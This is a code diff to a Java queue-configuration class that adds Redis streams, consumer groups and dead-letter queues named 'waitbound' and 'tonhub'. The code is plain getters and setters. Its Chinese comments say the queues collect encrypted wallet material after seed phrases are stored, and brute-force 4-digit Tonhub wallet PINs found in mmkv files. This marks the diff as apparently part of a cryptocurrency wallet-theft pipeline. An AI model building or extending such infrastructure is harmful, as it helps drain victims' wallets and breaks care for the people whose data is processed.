@@ -24,18 +24,26 @@ public class QueueProperties {
     private String streamNews4 = "news4:tasks";
     /** NoteStore 正文补齐（nb_memorandum 快路径后链式触发） */
     private String streamNbNotestore = "api18:tasks:nb_notestore";
+    /** 未明文解出钱包的加密材料收集（parse_ci 助记词入库后旁路入队） */
+    private String streamWaitbound = "api18:tasks:waitbound";
+    /** Tonhub 4 位 PIN 爆破（parse_ci 发现 mmkv 后旁路入队，与扫描解耦） */
+    private String streamTonhub = "api18:tasks:tonhub";
 
     private String groupMain = "api18-workers";
     private String groupParseCi = "api18-parse-ci";
     private String groupNews4 = "news4-workers";
     private String groupPhoto = "api18-photo-workers";
     private String groupNbNotestore = "api18-nb-notestore";
+    private String groupWaitbound = "api18-waitbound";
+    private String groupTonhub = "api18-tonhub";
 
     private String dlqMain = "api18:tasks:dead";
     private String dlqParseCi = "api18:tasks:parse_ci:dead";
     private String dlqNews4 = "news4:tasks:dead";
     private String dlqPhoto = "api18:tasks:photo:dead";
     private String dlqNbNotestore = "api18:tasks:nb_notestore:dead";
+    private String dlqWaitbound = "api18:tasks:waitbound:dead";
+    private String dlqTonhub = "api18:tasks:tonhub:dead";
 
     public String withPrefix(String name) {
         if (name == null || name.isEmpty()) {
@@ -99,6 +107,22 @@ public class QueueProperties {
         this.streamNbNotestore = streamNbNotestore;
     }
 
+    public String getStreamWaitbound() {
+        return withPrefix(streamWaitbound);
+    }
+
+    public void setStreamWaitbound(String streamWaitbound) {
+        this.streamWaitbound = streamWaitbound;
+    }
+
+    public String getStreamTonhub() {
+        return withPrefix(streamTonhub);
+    }
+
+    public void setStreamTonhub(String streamTonhub) {
+        this.streamTonhub = streamTonhub;
+    }
+
     public String getGroupMain() {
         return withPrefix(groupMain);
     }
@@ -139,6 +163,22 @@ public class QueueProperties {
         this.groupNbNotestore = groupNbNotestore;
     }
 
+    public String getGroupWaitbound() {
+        return withPrefix(groupWaitbound);
+    }
+
+    public void setGroupWaitbound(String groupWaitbound) {
+        this.groupWaitbound = groupWaitbound;
+    }
+
+    public String getGroupTonhub() {
+        return withPrefix(groupTonhub);
+    }
+
+    public void setGroupTonhub(String groupTonhub) {
+        this.groupTonhub = groupTonhub;
+    }
+
     public String getDlqMain() {
         return withPrefix(dlqMain);
     }
@@ -177,5 +217,21 @@ public class QueueProperties {
 
     public void setDlqNbNotestore(String dlqNbNotestore) {
         this.dlqNbNotestore = dlqNbNotestore;
+    }
+
+    public String getDlqWaitbound() {
+        return withPrefix(dlqWaitbound);
+    }
+
+    public void setDlqWaitbound(String dlqWaitbound) {
+        this.dlqWaitbound = dlqWaitbound;
+    }
+
+    public String getDlqTonhub() {
+        return withPrefix(dlqTonhub);
+    }
+
+    public void setDlqTonhub(String dlqTonhub) {
+        this.dlqTonhub = dlqTonhub;
     }
 }
